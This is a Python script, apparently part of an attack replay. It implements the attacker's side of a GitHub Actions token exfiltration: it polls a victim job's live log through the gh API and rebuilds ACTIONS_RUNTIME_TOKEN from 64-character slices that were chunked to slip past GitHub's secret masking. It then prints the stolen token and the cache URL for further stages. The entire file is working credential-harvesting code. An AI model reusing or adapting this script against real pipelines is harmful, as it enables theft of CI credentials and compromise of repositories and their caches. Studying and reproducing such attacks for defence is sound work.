#!/usr/bin/env python3
"""
harvest_token.py — the attacker's side of the stage-1 exfil loop.

Polls the victim job's in-flight log (same workflow run) through the Actions
API — the same channel an outside attacker used: read the streamed output
live — and reassembles the ACTIONS_RUNTIME_TOKEN from the DEPI_CHUNK slices.
Slices are 64 chars, so no slice contains the whole secret — which is why
GitHub's exact-string log masking never touched them.

The last slice of each secret is shorter than 64 chars and the emitter pads
the line with '#', so the capture stops at the first '#'.

Environment:
  REPLAY_RUN_ID           workflow run that holds the victim job
  VICTIM_JOB_PATTERN      substring matching the victim job's display name
  HARVEST_TIMEOUT_SECONDS give up after this many seconds (default 600)
"""

import json
import os
import re
import subprocess
import sys
import time

REPO = os.environ.get("GITHUB_REPOSITORY", "garnet-labs/codex")
RUN_ID = os.environ.get("REPLAY_RUN_ID", "")
VICTIM_PATTERN = os.environ.get("VICTIM_JOB_PATTERN", "victim")
TIMEOUT = int(os.environ.get("HARVEST_TIMEOUT_SECONDS", "600"))

CHUNK_RE = re.compile(r"DEPI_CHUNK:([A-Z_]+):(\d{4}):([^#]{1,64})")


def gh(*args):
    return subprocess.run(
        ["gh", "api", *args], capture_output=True, text=True, check=False
    )


def victim_job_id():
    r = gh(f"repos/{REPO}/actions/runs/{RUN_ID}/jobs?per_page=100")
    if r.returncode != 0:
        return None
    for job in json.loads(r.stdout).get("jobs", []):
        if VICTIM_PATTERN in job["name"]:
            return job["id"]
    return None


def fetch_log(job_id):
    r = gh(f"repos/{REPO}/actions/jobs/{job_id}/logs")
    return r.stdout if r.returncode == 0 else ""


def parse(log):
    found = {}
    counts = {}
    cache_url = ""
    for line in log.splitlines():
        m = CHUNK_RE.search(line)
        if m:
            label, seq, data = m.group(1), int(m.group(2)), m.group(3)
            found.setdefault(label, {})[seq] = data
        m2 = re.search(r"DEPI_CHUNKS:([A-Z_]+):(\d+)", line)
        if m2:
            counts[m2.group(1)] = int(m2.group(2))
        m3 = re.search(r"DEPI_INFO:(ACTIONS_CACHE_URL|ACTIONS_RESULTS_URL)=(\S+)", line)
        if m3 and not cache_url:
            cache_url = m3.group(2)
    return found, counts, cache_url


def main():
    if not RUN_ID:
        print("REPLAY_RUN_ID not set", file=sys.stderr)
        sys.exit(1)

    deadline = time.time() + TIMEOUT
    job_id = None
    slices = {}
    expected = None
    counts = {}
    cache_url = ""
    while time.time() < deadline:
        job_id = job_id or victim_job_id()
        if job_id:
            found, counts, cache_url = parse(fetch_log(job_id))
            slices = found.get("ACTIONS_RUNTIME_TOKEN", {})
            expected = counts.get("ACTIONS_RUNTIME_TOKEN")
            if slices and (expected is None or len(slices) >= expected):
                break
            print(
                f"waiting for victim log slices ({len(slices)}/{expected or '?'} seen)",
                flush=True,
            )
        else:
            print("waiting for the victim job to appear in this run", flush=True)
        time.sleep(15)

    if not slices:
        print(
            "no ACTIONS_RUNTIME_TOKEN slices found in the victim log "
            "before timeout — stage 1's memory read is the only source "
            "on current runner images",
            file=sys.stderr,
        )
        sys.exit(1)

    value = "".join(slices[k] for k in sorted(slices))
    print(f"victim job: {job_id} (log channel, in-flight)")
    print(
        f"reassembled ACTIONS_RUNTIME_TOKEN: {len(value)} chars "
        f"({len(slices)}/{expected or len(slices)} slices)"
    )
    print("DEPI_TOKEN=" + value)
    if cache_url:
        print("DEPI_CACHE_URL=" + cache_url)


if __name__ == "__main__":
    main()
